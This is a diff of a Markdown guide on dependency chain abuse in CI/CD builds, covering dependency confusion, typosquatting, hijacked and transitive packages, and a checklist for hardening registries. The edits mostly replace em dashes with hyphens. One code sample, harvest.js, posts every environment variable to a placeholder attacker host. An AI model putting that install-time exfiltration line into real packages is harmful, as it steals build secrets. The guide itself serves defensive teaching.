@@ -11,9 +11,9 @@
 
 ## What is Dependency Chain Abuse?
 
-**Dependency Chain Abuse** (CICD-SEC-3 in the OWASP Top 10 CI/CD Security Risks) covers every way an attacker can abuse how a build system *fetches* its software dependencies to trick that build into pulling a **malicious package** instead of—or in addition to—the intended one. The flaw is not in the dependency you chose; it is in the *resolution and retrieval process* that decides which artifact actually lands on the build agent.
+**Dependency Chain Abuse** (CICD-SEC-3 in the OWASP Top 10 CI/CD Security Risks) covers every way an attacker can abuse how a build system *fetches* its software dependencies to trick that build into pulling a **malicious package** instead of-or in addition to-the intended one. The flaw is not in the dependency you chose; it is in the *resolution and retrieval process* that decides which artifact actually lands on the build agent.
 
-A modern build declares a handful of direct dependencies, but those pull in hundreds of transitive ones, each fetched from a package registry (npm, PyPI, Maven Central, RubyGems, NuGet, crates.io, Go proxies) according to rules the developer rarely inspects: which registry is consulted first, whether a public registry can shadow a private name, whether a version is pinned or floating, whether an integrity hash is verified, and whether the package is allowed to run code *at install time*. Every one of those decisions is an attack surface. When any of them favours the attacker, arbitrary code executes on the build agent—one of the most privileged, most trusted, and least monitored machines in the software supply chain.
+A modern build declares a handful of direct dependencies, but those pull in hundreds of transitive ones, each fetched from a package registry (npm, PyPI, Maven Central, RubyGems, NuGet, crates.io, Go proxies) according to rules the developer rarely inspects: which registry is consulted first, whether a public registry can shadow a private name, whether a version is pinned or floating, whether an integrity hash is verified, and whether the package is allowed to run code *at install time*. Every one of those decisions is an attack surface. When any of them favours the attacker, arbitrary code executes on the build agent-one of the most privileged, most trusted, and least monitored machines in the software supply chain.
 
 ### Core Concept
 
@@ -40,7 +40,7 @@ Dependency Chain Abuse is fundamentally about **trust placed in a name**. Packag
 Build pipelines make this risk uniquely severe:
 
 - The build agent runs installs **non-interactively and automatically**, so a malicious install script executes with no human watching and no browser warning.
-- Build agents hold **high-value secrets**: registry tokens, cloud credentials, signing keys, deployment access—exactly what a supply-chain attacker wants.
+- Build agents hold **high-value secrets**: registry tokens, cloud credentials, signing keys, deployment access-exactly what a supply-chain attacker wants.
 - Output is **trusted downstream**: whatever the pipeline produces is signed, published, and shipped to every customer, so a single poisoned build fans out widely.
 - Dependency resolution is **opaque and transitive**: nobody reviews the 400th indirect package, and one poisoned link taints everything above it.
 
@@ -49,7 +49,7 @@ Build pipelines make this risk uniquely severe:
 ### Business Impact
 
 - **Supply-Chain Compromise**: A malicious dependency baked into your artifact is redistributed to every downstream consumer, turning one break into thousands.
-- **Secret and Credential Theft**: Install-time code on the build agent harvests environment variables, cloud metadata, and registry tokens—often the keys to the whole estate.
+- **Secret and Credential Theft**: Install-time code on the build agent harvests environment variables, cloud metadata, and registry tokens-often the keys to the whole estate.
 - **Loss of Release Integrity**: Once a build cannot be trusted, every artifact it produced must be treated as suspect, forcing costly re-builds and re-signing.
 - **Reputational and Regulatory Fallout**: Shipping malware to customers triggers disclosure obligations, contractual breach, and lasting trust damage.
 - **Time-Bomb Persistence**: A hijacked transitive package can sit dormant for months, so the compromise window is often far wider than the discovery date suggests.
@@ -70,7 +70,7 @@ To understand the abuse, you must understand what "install this dependency" real
 1. Reads a manifest (`package.json`, `requirements.txt`, `pom.xml`, `go.mod`).
 2. Consults one or more **configured registries / index URLs** to find candidate versions of each name.
 3. Applies a **version-selection rule** (semver ranges, "highest wins", nearest-wins) to pick one candidate.
-4. Downloads the artifact and—*if configured*—verifies an **integrity hash** against a lockfile.
+4. Downloads the artifact and-*if configured*-verifies an **integrity hash** against a lockfile.
 5. Optionally executes **install-time lifecycle scripts** (npm `preinstall`/`postinstall`, Python `setup.py`, Gradle build logic).
 
 Every abuse class below targets one of those five steps: the *registry it asks*, the *version it picks*, the *name it trusts*, the *hash it fails to check*, or the *script it lets run*.
@@ -89,12 +89,12 @@ Every abuse class below targets one of those five steps: the *registry it asks*,
 ```
 
 ```js
-// harvest.js — executes as the CI user, no prompt, no sandbox
+// harvest.js - executes as the CI user, no prompt, no sandbox
 require('https').request('https://attacker.example/collect', { method: 'POST' })
   .end(JSON.stringify(process.env));      // exfiltrate every build secret
 ```
 
-**Key point**: merely *installing* a dependency—you never have to `import` or run it—can execute attacker code. This is why "we don't use that package directly" is not a defence.
+**Key point**: merely *installing* a dependency-you never have to `import` or run it-can execute attacker code. This is why "we don't use that package directly" is not a defence.
 
 ## The Five Abuse Classes
 
@@ -108,11 +108,11 @@ require('https').request('https://attacker.example/collect', { method: 'POST' })
 
 ### 1. Dependency Confusion / Substitution
 
-An organisation uses internally-named packages (for example `acme-auth-utils`) that live only in a private registry. If the build's package manager is configured to fall back to the public registry for names it cannot find privately—or to consult both and pick the highest version—an attacker can publish a package with the *same name* on the public registry at an absurdly high version. The resolver, preferring the higher number, fetches the attacker's copy. No typo, no social engineering: the naming and resolution rules do all the work.
+An organisation uses internally-named packages (for example `acme-auth-utils`) that live only in a private registry. If the build's package manager is configured to fall back to the public registry for names it cannot find privately-or to consult both and pick the highest version-an attacker can publish a package with the *same name* on the public registry at an absurdly high version. The resolver, preferring the higher number, fetches the attacker's copy. No typo, no social engineering: the naming and resolution rules do all the work.
 
 ### 2. Typosquatting
 
-Attackers register public names that are a single edit away from popular packages—transposed letters, missing characters, or a hyphen swapped for an underscore. A developer or a generated manifest with a typo pulls the malicious package. Because the name is *almost* right, it survives casual review.
+Attackers register public names that are a single edit away from popular packages-transposed letters, missing characters, or a hyphen swapped for an underscore. A developer or a generated manifest with a typo pulls the malicious package. Because the name is *almost* right, it survives casual review.
 
 ### 3. Brandjacking
 
@@ -124,11 +124,11 @@ Instead of creating a new malicious name, the attacker seizes an *existing* trus
 
 ### 5. Transitive Dependency Poisoning
 
-You vet your direct dependencies, but each of them has its own dependencies, several levels deep. Compromise of any node in that graph—via any of the classes above—flows upward into your build even though you never named the malicious package. Depth hides it: nobody audits the fortieth indirect dependency.
+You vet your direct dependencies, but each of them has its own dependencies, several levels deep. Compromise of any node in that graph-via any of the classes above-flows upward into your build even though you never named the malicious package. Depth hides it: nobody audits the fortieth indirect dependency.
 
 ## Real-World Impact
 
-> The cases below are described as **incident classes**—recurring, publicly-documented patterns—rather than specific advisories. The goal is to teach the shape of the attack, not to catalogue individual CVEs.
+> The cases below are described as **incident classes**-recurring, publicly-documented patterns-rather than specific advisories. The goal is to teach the shape of the attack, not to catalogue individual CVEs.
 
 ### Case Class 1: The 2021 Dependency-Confusion Research Wave
 
@@ -138,7 +138,7 @@ You vet your direct dependencies, but each of them has its own dependencies, sev
 
 **Impact**:
 - Demonstrated that dependency confusion was not theoretical: build systems across the industry silently preferred the public copy.
-- Triggered widespread hardening—scope reservation, registry pinning, and namespace claiming—and remains the canonical example of substitution attacks.
+- Triggered widespread hardening-scope reservation, registry pinning, and namespace claiming-and remains the canonical example of substitution attacks.
 
 **Root Cause**: Package managers configured to consult a public registry as a fallback (or in parallel) for names that were meant to be private, combined with "highest version wins" selection.
 
@@ -149,7 +149,7 @@ You vet your direct dependencies, but each of them has its own dependencies, sev
 - The new maintainer added a malicious transitive dependency that targeted a specific downstream application, hidden inside an obfuscated payload.
 
 **Impact**:
-- The malicious code rode into countless projects transitively, illustrating how a single trusted link—deep in the graph—can weaponise the whole ecosystem above it.
+- The malicious code rode into countless projects transitively, illustrating how a single trusted link-deep in the graph-can weaponise the whole ecosystem above it.
 
 **Root Cause**: Social takeover of a trusted maintainer position plus unreviewed transitive dependencies and install/runtime code.
 
@@ -182,11 +182,11 @@ Dependency Chain Abuse is one of the most actively exploited categories in the s
 
 ### Myth 2: "We don't call that package's code, so it can't hurt us"
 
-**Reality**: Install-time scripts (`postinstall`, `setup.py`) run during `install`—before any of your code executes and whether or not you ever import the package.
+**Reality**: Install-time scripts (`postinstall`, `setup.py`) run during `install`-before any of your code executes and whether or not you ever import the package.
 
 ### Myth 3: "Our internal packages are private, so nobody can target them"
 
-**Reality**: The *name* of an internal package leaks constantly—in error messages, public commits, job postings, and bundles. If the name is unclaimed publicly and your resolver can reach the public registry, it is a dependency-confusion target.
+**Reality**: The *name* of an internal package leaks constantly-in error messages, public commits, job postings, and bundles. If the name is unclaimed publicly and your resolver can reach the public registry, it is a dependency-confusion target.
 
 ### Myth 4: "A lockfile means we're fully protected"
 
@@ -198,28 +198,28 @@ Dependency Chain Abuse is one of the most actively exploited categories in the s
 
 ### Myth 6: "Dependency scanning (SCA) will catch it"
 
-**Reality**: SCA is essential but reactive—it flags *known* vulnerable versions. A brand-new typosquat or a fresh malicious version has no advisory yet. Scanning complements, but does not replace, controlling resolution.
+**Reality**: SCA is essential but reactive-it flags *known* vulnerable versions. A brand-new typosquat or a fresh malicious version has no advisory yet. Scanning complements, but does not replace, controlling resolution.
 
 ## How Dependency Chain Abuse Differs from Related Risks
 
 | Aspect | Dependency Chain Abuse (CICD-SEC-3) | Vulnerable/Outdated Components | Poisoned Pipeline Execution |
 |--------|-------------------------------------|--------------------------------|------------------------------|
 | **Root cause** | How dependencies are *fetched/resolved* | Known bugs in the version you use | Untrusted code paths in the pipeline definition |
-| **Attacker action** | Publish/hijack a package the build resolves | None—the flaw already exists | Inject steps via config/PR |
+| **Attacker action** | Publish/hijack a package the build resolves | None-the flaw already exists | Inject steps via config/PR |
 | **Typical fix** | Control registries, pin + hash, scope names, disable scripts | Patch / upgrade | Isolate and review pipeline triggers |
 | **Detection** | Resolution audit, provenance, new-package monitoring | SCA / version audit | Pipeline config review |
 
 ## Key Takeaways
 
-1. **The flaw is in resolution, not in the package you chose**—attackers exploit how builds decide which bytes to fetch.
-2. **Installing is executing**—lifecycle scripts run automatically on the build agent, no import required.
-3. **Names are trust**—confusion, typosquatting, and brandjacking all abuse the gap between a name and an artifact.
-4. **Hijacked and transitive packages bypass "reputable-only" policies**—you own the whole graph, not just your direct picks.
-5. **Defence is about control**—one trusted registry, claimed names, pinned versions and hashes, and scripts off by default.
+1. **The flaw is in resolution, not in the package you chose**-attackers exploit how builds decide which bytes to fetch.
+2. **Installing is executing**-lifecycle scripts run automatically on the build agent, no import required.
+3. **Names are trust**-confusion, typosquatting, and brandjacking all abuse the gap between a name and an artifact.
+4. **Hijacked and transitive packages bypass "reputable-only" policies**-you own the whole graph, not just your direct picks.
+5. **Defence is about control**-one trusted registry, claimed names, pinned versions and hashes, and scripts off by default.
 
 ## How to Identify if You're Vulnerable
 
-- [ ] Do builds fetch dependencies only from a controlled internal proxy/registry with an allow-list—never directly from public registries?
+- [ ] Do builds fetch dependencies only from a controlled internal proxy/registry with an allow-list-never directly from public registries?
 - [ ] Are all internal package names **scoped** and their scopes/names claimed on the public registries?
 - [ ] Is every private scope pinned to the private registry, with **no public fallback**?
 - [ ] Are versions pinned *and* integrity hashes verified (lockfile + `npm ci` / `--require-hashes`)?
